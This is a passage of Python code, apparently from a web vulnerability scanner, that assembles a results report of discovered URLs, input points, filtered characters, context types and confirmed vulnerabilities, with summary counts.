            'discovered_urls': list(self.discovered_urls),
            'input_points': self.input_points,
            'character_filters': self.character_filters,
            'context_analysis': self.context_analysis,
            'vulnerability_confirmations': self.vulnerability_confirmations,
            'summary': {
                'total_urls': len(self.discovered_urls),
                'total_input_points': len(self.input_points),
                'total_vulnerabilities': len(self.vulnerability_confirmations),
                'filtered_characters': len(set([char for filters in self.character_filters.values() for char in filters['filtered_chars']])),
                'context_types': list(set([ctx['context_type'] for ctx in self.context_analysis.values()]))
            }
        }